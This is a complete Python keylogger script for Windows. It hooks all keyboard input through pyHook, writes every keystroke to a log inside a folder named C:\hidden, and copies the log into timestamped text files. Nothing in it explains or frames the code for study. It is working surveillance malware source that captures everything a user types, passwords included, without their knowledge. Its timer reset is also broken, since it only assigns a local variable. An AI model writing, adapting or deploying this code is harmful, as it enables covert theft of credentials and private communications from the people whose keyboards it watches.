import pyHook, pythoncom, sys, logging
import os
import time

newpath = r'C:\hidden' 
if not os.path.exists(newpath):
    os.makedirs(newpath)

t_end = time.time() + 10
	
file_log = 'C:\\hidden\hidden.txt'

def CheckTime(endtime):
	
	if time.time() > endtime:
	
		data = open('C:\\hidden\\hidden.txt').read()
		newdoc = open('C:\\hidden\\formatted' + str(time.time()) + ".txt", "w")
		newdoc.write(data.replace('\n', "").replace('\r', ""))
		newdoc.close()
		t_end = time.time() + 10
		return
	else:
		
		return 

def OnKeyboardEvent(event):
	
	CheckTime(t_end)
	logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
	chr(event.Ascii)
	logging.log(10,chr(event.Ascii))
	return True	

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()




exit() 
	